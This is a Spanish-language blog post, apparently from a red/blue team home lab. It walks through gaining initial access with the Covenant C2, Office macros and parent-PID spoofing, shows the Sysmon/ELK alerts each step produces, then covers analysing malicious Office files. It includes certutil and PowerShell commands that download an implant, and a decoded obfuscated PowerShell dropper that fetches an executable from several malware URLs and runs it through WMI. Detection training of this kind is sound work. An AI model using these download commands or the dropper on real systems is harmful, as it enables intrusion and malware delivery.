---
title: Compromiso Incial - En Construcción
date: 2021-05-31 18:33:00 +02:00
license: false
show_edit_on_github: false
show_subscribe: false
---

En esta series de artículos intentare mostrar y detallar técnicas tanto ofensivas como defensivas.

Si deseas proponer alguna mejora, o algún comentario, ya sea duda o simplemente conocer más sobre esto, por favor, sin miedo escribe por telegram o twitter :)


### Infraestructura:

- Debian 10 , corriendo ELK
- Windows 10, ordenador del usuario, corriendo sysmon.
- Kali Linux, máquina atacante

A nivel de herramientas, utilizaré Covenant, como command and control.


# Acceso Inicial

Una vez realizado el reconocimiento de la entidad a analizar y sus trabajadores, mediante técnicas de osint, por ejemplo. Debemos buscar el foothold en la entidad.

La principal manera para acceder internamente dentro de una organización es a través de las macros de office.

Surge un pequeñó problema, para ello necesitamos que el usuario active las macros pero resultará de manera sencilla ya que en una fase anterior, hemos recopilado toda información sobre el usuario, asique debemos utilizar la información consegida durante esa fase de reconocimiento y aplicarlo.



Es conveniente recalcar, que estás tecnicas realmenten funcionan, y cada cuál es libre de realizarlas.



Existen diferentes tácticas,  y diferentes técnicas para obtener un acceso inicial.

Tenemos opciones:

* [T1566.001](https://attack.mitre.org/techniques/T1566/001/) 	Spearphishing Attachment

* [T1566.002](https://attack.mitre.org/techniques/T1566/002/) 	Spearphishing Link

* [T1566.003](https://attack.mitre.org/techniques/T1566/003/) 	Spearphishing via Service 

Dentro de estás formas, tenemos difentes técnicas, como dropper/downloadders, como la inyección en memoria.


Las macros principales que nos podemos encontrar, y englobando unicamente ficheros office, son de dos tipo:

* Visual Basic macros VBA
* Excel 4.0

Y las funciones más comunes para realizar la ejecución son 
WorkBook_Open() o Document_Open(), Auto_Open()


Aunque existen otras, como Autocierre, Autoexit.

En este primer ejemplo, utilizaremos la herramienta covenant como C2 y utilizaremos un fichero word con macros para instalar nuestra implante o grunt, como es conocido en covenant.


### Covenant

En un primer paso, debemos crear un listener

![image001.png](/uploads/InitialAccess/image001.png)

El siguiente paso será configurar las opciones, debemos comprobar la dirección IP a la que queremos que se conecte nuestro grunt

![image002.png](/uploads/InitialAccess/image002.png)

El siguiente paso, **será crear nuestro payload**, nos vamos al tab Launchers

![image004.png](/uploads/InitialAccess/image004.png)

En este ejemplo, utilizamos un binario .net, pero podemos utilizar cualquuier otro.

Debemos especificar el listener, entre otros apartados. Y generamos nuestro primer launcher.

![image005.png](/uploads/InitialAccess/image005.png)

Una vez generado y descargado en nuestra máquina local, debemos enviarlo  al equipo del usuario.

**Depende del escenario que nos encontremos, debemos realizar unas técnicas u otras.**


Puede dar el caso, que tuviesemos acceso interno dentro de la organización, en este caso deberíamos desplegar el implante, esto es posible, levantando un servidor y realizando la descarga vía powershell , o  del binario certutil.exe 

A la hora de realizar este ejercicio, Windows Defenders saltará y nos eliminará el implante. Debemos identificar posibles bypasses, pero en este artítulo no entrarémos en ello. En la siguiente imágen, vemos la alerta genera por WD.

![image006.png](/uploads/InitialAccess/image006.png)

Debemos tener en cuenta que saltará información si no conseguimos bypassear el AV.

Para descargar el fichero utilize la expresión:

`Invoke-WebRequest -uri http://192.168.2.14:8000/GruntHTTP.exe -OutFile grunt.exe`


Se nos generan dos alertas

![image007.png](/uploads/InitialAccess/image007.png)

Una primera alerta, la creación del fichero
![image008.png](/uploads/InitialAccess/image008.png)

Y una segunda alerta, la conexión entre ambos equipos

![image009.png](/uploads/InitialAccess/image009.png)


Tenemos otras opciones para descargar el fichero, como puede ser certutil

`certutil.exe -urlcache -split -f http://192.168.2.14:8000/GruntHTTP.exe grunt.exe`


![image010.png](/uploads/InitialAccess/image010.png)


Como vemos los procesos son diferentes, a diferencia, no se llega a crear una alerta de network.



### Ejecución

En este paso, ejecutaremos el binario con el objetivo de obtener una conexión entre ambos equipo y también, para ver que información estamos generando.

Se nos genera la siguiente información:

![image011.png](/uploads/InitialAccess/image011.png)






La primera alerta, la creación de un proceso

![image012.png](/uploads/InitialAccess/image012.png)

Conexión de red:

![image013.png](/uploads/InitialAccess/image013.png)

QueryDNS:

![image014.png](/uploads/InitialAccess/image014.png)

Conexión realiza, debería aparecernos un nuevo grunt.

![image015.png](/uploads/InitialAccess/image015.png)







Como decía anteriormente, el contexto mostrado ahora es diferete. Ya que nos encontramos fuera de la red y queremos acceder de manera interna.

En este caso, utilizaremos las macros de word. En concreto una especifíca para bypassear AV´s.

### Parent PID and Command-line Argument Spoofing

[T1134 ](https://attack.mitre.org/techniques/T1134/004/)- Parent PID Spoofing 

> PPID spoofing is a technique that allows attackers to start programs with arbitrary parent process set. This helps attackers make it look as if their programs were spawned by another process (instead of the one that would have spawned it if no spoofing was done) and it may help evade detections, that are based on parent/child process relationships.


Está sin lugar a dudas es muy interesante, a resaltar, el proceso hijo obtiene los privilegios del proceso padre.

Utilizaremos esta macro : https://raw.githubusercontent.com/christophetd/spoofing-office-macro/master/macro64.vba

Leyendo el código fuente, observamos llamadas a las APIS CreateProcess, OpenProcess, UpdateProcThreadAttribute

Seguimos leyendo, tenemos la función Sub AutoOpen(), donde tenemos la ejecución de powershell original, la variable pid = getPidByName("explorer.exe") y por último la ejecución del memoría de nuestro payload.




El primer paso, generamos la macro.

![image021.png](/uploads/InitialAccess/image021.png)


Y ya una vez ejecutado por el usuario. Nos genera la siguiente información.

![image022.png](/uploads/InitialAccess/image022.png)

El primer paso, es la creación de un proceso:

![image023.png](/uploads/InitialAccess/image023.png)

![image024.png](/uploads/InitialAccess/image024.png)
Elastic, nos genera 6 alertas recibiendo el nombre de Provider Lifecycle

Estas alertas, se tratan de activar diferentes providers, entre ellos son Variable, function, filesystem, Environment, Alias, Registry.


La información que contienen es la siguiente:

![image025.png](/uploads/InitialAccess/image025.png)

La siguiente alerta con código 4104, execute a command:

![image026.png](/uploads/InitialAccess/image026.png)

![image027.png](/uploads/InitialAccess/image027.png)

Siguiendo con las conexiones de red para descargar y establecimiento de la conexión 

![image028.png](/uploads/InitialAccess/image028.png)

![image029.png](/uploads/InitialAccess/image029.png)


Y por ultimo

![image030.png](/uploads/InitialAccess/image030.png)


Podemos seguir investigando con process explorer, vemos que powershell se ejecuta como un proceso hijo de explorer.exe

![image031.png](/uploads/InitialAccess/image031.png)

Podemos revisar las conexiónes de red, y ver que se tratan de procesos de powershell

![image032.png](/uploads/InitialAccess/image032.png)

Existen otras herramientas como process hacker y observamos como se representan las conexiones entre equiop víctima y equipo atacante.


![image035.png](/uploads/InitialAccess/image035.png)

# Analizando Documentos Offices

A la hora de analizar fichero offices tenemos diferentes formas ade llevarlo acabo, existen herramientas automatizadas como anyrun o VT. U otras herramientas como oledump, olevba,  vipermonkey

A la hora de analizar un incidente de seguridad, realizar un análisis automatizado puede que sea la opción más correcta. Una rápida respuesta a esta situción es crítico.

En tal caso, AnyRun es una buena utilidad para analizar estos ficheros. 


![image036.png](/uploads/InitialAccess/image036.png)



Como podemos observar, disponemos de diferentes paneles para observar la información. Solicitudes HTTP, Conexiones, processos ejecutados, así como indicadores de coompromiso.

En este caso, vemos la ejecución de un powershell ofuscado en base64.

Podemos visualizar el instrucción con el comando:

`echo "churro" | base64 -d`


La instrución generada es la siguiente:

`$liechrouhwuw='vuacdouvcioxhaol';[Net.ServicePointManager]::"SE`cuRiTy`PRO`ToC`ol" = 'tls12, tls11, tls';$deichbeudreir = '337';$quoadgoijveum='duuvmoezhaitgoh';$toehfethxohbaey=$env:userprofile+'\'+$deichbeudreir+'.exe';$sienteed='quainquachloaz';$reusthoas=.('n'+'ew-ob'+'ject') nEt.weBclIenT;$jacleewyiqu='https://haoqunkong.com/bn/s9w4tgcjl_f6669ugu_w4bj/*https://www.techtravel.events/informationl/8lsjhrl6nnkwgyzsudzam_h3wng_a6v5/*http://digiwebmarketing.com/wp-admin/72t0jjhmv7takwvisfnz_eejvf_h6v2ix/*http://holfve.se/images/1ckw5mj49w_2k11px_d/*http://www.cfm.nl/_backup/yfhrmh6u0heidnwruwha2t4mjz6p_yxhyu390i6_q93hkh3ddm/'."s`PliT"([char]42);$seccierdeeth='duuzyeawpuaqu';foreach($geersieb in $jacleewyiqu){try{$reusthoas."dOWN`loA`dfi`Le"($geersieb, $toehfethxohbaey);$buhxeuh='doeydeidquaijleuc';If ((.('Get-'+'Ite'+'m') $toehfethxohbaey)."l`eNGTH" -ge 24751) {([wmiclass]'win32_Process')."C`ReaTe"($toehfethxohbaey);$quoodteeh='jiafruuzlaolthoic';break;$chigchienteiqu='yoowveihniej'}}catch{}}$toizluulfier='foqulevcaoj'`


Podemos interpretar perfectamente, la llamada a la clase WebClient y luego indica las urls a las que quiere consultar la información.

El siguiente caso llama a la clase wmi32_process, al método créate, para crear un nuevo proceso, con el fichero que se ha descargado y ejecutarlo vía WMI.

Esta misma información, es exactamente la misma información obtenida a través del servicio AnyRun.

En otras situaciones, anyrun no es capaz de detectar este comportamiento.

![image036.png](/uploads/InitialAccess/image036.png)

En estos casos, es necesario realizar un análisis más a fondo del documento.

### Oledump.py

SI nos fijamos detenidamente en el output, en el apartado de la izquierda, tenemos unas letras “M”, “m”. Debemos rebuscar en los streams donde la M es como vemos, la letra mayúscula, la m referencia atributos.

![image038.png](/uploads/InitialAccess/image038.png)


Podemos extraer las macros de la siguiente forma:

`oledump.py -s 13 sample.bin`


Como vemos, este paso debería ir haciendolo por cada macro encontrada.

### OleVba

> olevba is a script to parse OLE and OpenXML files such as MS Office documents (e.g. Word, Excel), to detect VBA Macros, extract their source code in clear text, and detect security-related patterns such as auto-executable macros, suspicious VBA keywords used by malware, anti-sandboxing and anti-virtualization techniques, and potential IOCs (IP addresses, URLs, executable filenames, etc). It also detects and decodes several common obfuscation methods including Hex encoding, StrReverse, Base64, Dridex, VBA expressions, and extracts IOCs from decoded strings. XLM/Excel 4 Macros are also supported in Excel and SLK files.


![image039.png](/uploads/InitialAccess/image039.png)


Como vemos, podemos obtener toda la información necesario para tener los suficientes indicadores para responder ante las siguientes pregunta.

¿Es malicio este fichero?¿Que comportamiento tiene?¿Que urls pertenecen a la organización?





Thanks To:

* Hausec for creating a [red & blue team lab](https://hausec.com/2021/03/04/creating-a-red-blue-team-home-lab/)


* Ryan Cobb and Justin Bui for [workshop with Covenant](https://www.youtube.com/watch?v=oN_0pPI6TYU)

* F-Secure for [initial access workshop´s](https://labs.f-secure.com/blog/attack-detection-fundamentals-initial-access-lab-1/)

 

